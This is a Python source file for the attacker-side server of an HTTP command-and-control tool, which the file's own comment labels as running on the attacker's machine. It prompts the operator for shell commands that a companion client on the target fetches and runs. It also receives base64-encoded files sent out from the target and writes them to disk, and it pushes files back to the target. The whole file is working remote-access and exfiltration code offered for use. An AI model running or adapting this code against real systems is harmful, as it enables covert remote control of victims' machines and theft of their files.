#Server ----> runs on the attacker's machine

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
import os,cgi
import base64
HTTP_STATUS_OK = 200

# IP and port the HTTP server listens on (will be queried by client.py)
ATTACKER_IP = '0.0.0.0'
ATTACKER_PORT = 8080

class MyHandler(BaseHTTPRequestHandler):

    # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
    def log_message(self, format, *args):
        pass

    def save_file(self, length):
        data = parse_qs(self.rfile.read(length).decode())
        with open("{}".format(data['path'][0]),'wb') as output_file:
            output_file.write(base64.urlsafe_b64decode(data["rfile"][0]))
        print("File saved as {}".format(data['path'][0]))

    # Send command to client (on Target)
    def do_GET(self):
       if self.path.find('?get')>=0:
        try:
         path=urlparse(self.path).query.split('=')[1]
         self.send_response(HTTP_STATUS_OK)
         self.send_header("Content-type", "text/html")
         self.end_headers()    
         with open('{}'.format(path),'rb') as output_file:
          self.wfile.write(base64.urlsafe_b64encode(output_file.read()))
         print('Send Files as {}'.format(path))    
        except Exception as e:
         print(e)   
        finally:
         return   
       else: 
        command = input("Shell> ")
        if command == 'quit':
         os._exit(0)    
        self.send_response(HTTP_STATUS_OK)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()

        if self.path == '/store':
            try:
                self.save_file(length)
            except Exception as e:
                print(e)
            finally:
                return

        data = parse_qs(self.rfile.read(length).decode())
        if "rfile" in data:
            print(data["rfile"][0])


if __name__ == '__main__':
    myServer = HTTPServer((ATTACKER_IP, ATTACKER_PORT), MyHandler)

    try:
        print(f'[*] Server started on {ATTACKER_IP}:{ATTACKER_PORT}')
        myServer.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        myServer.server_close()
